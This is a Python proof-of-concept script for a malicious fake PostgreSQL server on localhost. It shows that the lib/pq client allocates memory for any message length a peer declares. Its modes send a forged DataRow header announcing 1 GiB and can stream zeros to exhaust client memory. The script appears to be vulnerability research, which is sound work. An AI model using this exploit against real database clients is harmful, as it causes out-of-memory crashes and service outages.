"""Hostile 'PostgreSQL' server proving lib/pq allocates whatever length the
peer declares - even on the 'fixed' main branch.

Modes:
  http      - reply with an HTTP error page (the original incident trigger)
  d1g       - reply with a DataRow ('D') header declaring a 1 GiB payload:
              'D' is a ValidLongMessageType, so main-branch pq applies NO cap
              to it (only non-valid types are capped at proto.MaxMsgLen=30000)
  d1gstream - d1g + actually stream zeros so RSS grows (64-bit OOM proof)

Usage: python3 evil_pg.py <mode> [port] [hold_s]
Every payload seen is appended to ./evil.payloads as evidence.
"""
import socket
import struct
import sys
import threading
import time

MODE = sys.argv[1] if len(sys.argv) > 1 else "d1g"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5433
HOLD = float(sys.argv[3]) if len(sys.argv) > 3 else 30.0
LOG = "evil.payloads"

ONE_GIB = 1 << 30  # 1073741824
# type 'D' (DataRow) + length field (includes its own 4 bytes) -> n = 1 GiB
D1G = b"D" + struct.pack(">I", ONE_GIB + 4)

HTTP_REPLY = (
    b"HTTP/1.1 403 Forbidden\r\nServer: honeypot\r\n"
    b"Content-Type: text/html\r\nContent-Length: 19\r\n\r\naccess denied!!!!\n"
)


def handle(c):
    try:
        c.settimeout(60)
        try:
            data = c.recv(4096)
        except socket.timeout:
            data = b""
        if data:
            with open(LOG, "a") as f:
                f.write("%s mode=%s len=%d hex=%s\n"
                        % (time.strftime("%H:%M:%S"), MODE, len(data), data[:32].hex()))
            if MODE == "http":
                c.sendall(HTTP_REPLY)
            else:
                c.sendall(D1G)
                if MODE == "d1gstream":
                    chunk = b"\x00" * (1 << 20)
                    sent = 0
                    try:
                        while sent < (200 << 20):  # cap 200 MiB per conn
                            c.sendall(chunk)
                            sent += len(chunk)
                    except (BrokenPipeError, ConnectionResetError, socket.timeout):
                        pass
                time.sleep(HOLD)
    except Exception:
        pass
    finally:
        try:
            c.close()
        except OSError:
            pass


srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", PORT))
srv.listen(256)
print("evil pg on 127.0.0.1:%d mode=%s hold=%.0fs" % (PORT, MODE, HOLD), flush=True)
while True:
    conn, _ = srv.accept()
    threading.Thread(target=handle, args=(conn,), daemon=True).start()
